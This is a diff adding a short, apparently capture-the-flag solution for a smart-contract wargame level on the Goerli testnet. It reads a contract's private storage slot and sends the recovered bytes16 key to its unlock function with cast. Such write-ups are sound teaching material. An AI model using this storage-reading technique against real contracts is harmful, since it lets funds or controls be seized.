@@ -1,0 +1,7 @@
+1. web3.eth.getStorageAt("0x0Ec3c444F079F8d521e59eF3fa438544e41fdd3b", 2, console.log)
+
+2. cast send 0x9ACe95b7a97d336c85f1e119eeb42bD47D4CEFA0 "unlock(bytes16 _key)" 0x8fc011189a555e9d496f2f55b164a1a0 \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 \
+--gas-price 1gwei
